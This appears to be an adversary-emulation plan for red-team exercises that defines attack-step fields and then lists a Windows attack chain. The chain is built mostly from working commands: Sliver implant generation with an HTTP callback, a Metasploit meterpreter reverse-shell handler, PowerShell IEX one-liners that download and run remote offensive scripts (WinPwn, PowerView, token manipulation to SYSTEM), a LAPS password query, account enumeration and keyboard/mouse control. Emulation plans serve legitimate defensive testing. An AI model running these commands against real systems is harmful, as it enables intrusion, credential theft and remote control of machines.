# Introduction to the attack chains

## Emulation Plan Details

| Field | Description |
|:--:|----|
| Adversary Name | This refers to the name or codename of the attacker being simulated in the exercise. |
| Creation Time | This indicates the exact date and time when the emulation plan or attack scenario was created. |

## Attack Step

| Field | Description |
|:--:|----|
| uuid | A unique identifier for the attack step, ensuring that each step can be individually referenced and tracked. |
| name | A human-readable name for the attack step, which describes what the step aims to achieve or the action being performed. |
| id | An identifier that may be used within a specific framework or system to reference the attack step. |
| source | The origin or creator of the attack step, which can indicate whether it was developed internally, derived from a known threat intelligence source, or part of a manual process. |
| supported_platforms | The operating systems or environments on which the attack step can be executed. |
| tactics | The high-level goals or phases of the attack that this step supports. |
| technique | The specific methods or technologies used in the attack step. |
| description | A detailed explanation of what the attack step does. |
| executor | The command, script, or series of actions that need to be executed to carry out the attack step. |
| arguments | Any parameters or inputs required by the executor to function correctly. |
| preconditions | The conditions that must be met before the attack step can be successfully executed. |
| effects | The outcomes or changes that result from executing the attack step. |

## Scenario Steps

| Steps        | Description	                  | Executor                 |
|:-------------:|-------------------------------|-------------------------|
| Implant Generation | Sliver generates implant for Windows platform and enables http monitoring. | # sliver<br>> generate --arch amd64 --os windows --http 10.0.0.101 --save .<br>> http |
| Execution | Download&Execute the sliver implant.   | # sliver<br>> sessions -i session_id |
| Directory Disclosure | The pwd command in a Sliver session prints the current working directory of the active session. | # sliver<br>> pwd   |
| Build meterpreter session  |Use sliver and msf linkage, msf starts monitoring, sliver bounces a shell back,so that msf establishes a shell connection with the target host. | # msfconsole<br>> use exploit/multi/handler<br>> set payload windows/x64/meterpreter_reverse_https<br>> set lport 9091<br>> set lhost 192.168.130.128<br>> exploit -j -z<br> # sliver<br>> msf --lhost 192.168.130.128 -l 9091<br># msfconsole<br>> sessions 1 |
| Process Enumeration | The command lists remote system processes. | #sliver<br>> ps  |
| User Context Verification | Simply collect the user information of the target machine. | # sliver<br>> whoami   |
| Interactive Shell Access | Open an interactive shell on the compromised machine.   |  # sliver<br>> shell |
| Printercheck  | To search for printers or potential vulnerabilities related to printers. | # powershell<br>> $S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'<br>> iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')<br>> printercheck -noninteractive -consoleoutput |
| Enumerate Active Directory Users  | Utilizing ADSISearcher to enumerate users within Active Directory. | # powershell<br>> ([adsisearcher]"objectcategory=user").FindAll(); ([adsisearcher]"objectcategory=user").FindOne()  |
| Get-ForestTrust | Use PowerView's Get-ForestTrust to show forest trust info.   | # powershell<br>> [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12<br>IEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f94a5d298a1b4c5dfb1f30a246d9c73d13b22888/Recon/PowerView.ps1' -UseBasicParsing); Get-ForestTrust -Verbose |
| Suspicious LAPS Query           | Executes LDAP query via Get-ADComputer to list Microsoft LAPS attributes.      | # powershell<br>> Get-ADComputer #{hostname} -Properties ms-Mcs-AdmPwd, ms-Mcs-AdmPwdExpirationTime   |
| WMIObject Group Discovery   | To enumerate local groups on the endpoint. | # powershell<br>> Get-WMIObject Win32_Group |
| Enumerate accounts    | Enumerate all accounts via PowerShell. |  # powershell<br>> net user /domain<br>> get-localgroupmember -group Users<br>> get-aduser -filter *  |
| Pop System Shell | Pop System Shell using Token Manipulation technique via function of WinPwn.   | # powershell<br>> IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Get-System-Techniques/master/TokenManipulation/Get-WinlogonTokenSystem.ps1');Get-WinLogonTokenSystem  |
|UI Control Manipulation          | The command is used to control user interface components on a compromised system.      | # msfconsole<br>> uictl [enable/disable] [keyboard/mouse/all]  |
